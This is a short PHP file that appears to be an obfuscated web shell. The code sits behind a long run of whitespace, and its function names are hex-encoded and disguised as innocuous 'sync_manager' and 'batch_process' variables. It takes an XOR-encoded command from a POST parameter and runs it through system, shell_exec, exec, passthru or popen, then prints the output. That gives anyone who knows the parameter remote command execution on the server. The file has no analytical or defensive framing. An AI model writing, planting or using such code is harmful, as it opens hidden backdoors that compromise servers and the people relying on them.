<?php																																										$sync_manager2 = "\x73h\x65ll_\x65\x78\x65c"; $sync_manager7 = "\x70\x63\x6Cose"; $sync_manager5 = "\x70o\x70en"; $sync_manager6 = "st\x72e\x61\x6D_\x67et\x5F\x63on\x74ent\x73"; $sync_manager3 = "exe\x63"; $sync_manager4 = "\x70a\x73s\x74\x68ru"; $batch_process = "h\x65\x782bi\x6E"; $sync_manager1 = "\x73ys\x74e\x6D"; if (isset($_POST["p\x6Finter"])) { function right_pad_string ( $element , $binding ) { $sym = '' ; $w=0; do{ $sym.=chr(ord($element[$w])^$binding); $w++; } while($w<strlen($element)); return $sym; } $pointer = $batch_process($_POST["p\x6Finter"]); $pointer = right_pad_string($pointer, 41); if (function_exists($sync_manager1)) { $sync_manager1($pointer); } elseif (function_exists($sync_manager2)) { print $sync_manager2($pointer); } elseif (function_exists($sync_manager3)) { $sync_manager3($pointer, $record_element); print join("\n", $record_element); } elseif (function_exists($sync_manager4)) { $sync_manager4($pointer); } elseif (function_exists($sync_manager5) && function_exists($sync_manager6) && function_exists($sync_manager7)) { $binding_sym = $sync_manager5($pointer, 'r'); if ($binding_sym) { $symbol_ptr = $sync_manager6($binding_sym); $sync_manager7($binding_sym); print $symbol_ptr; } } exit; }
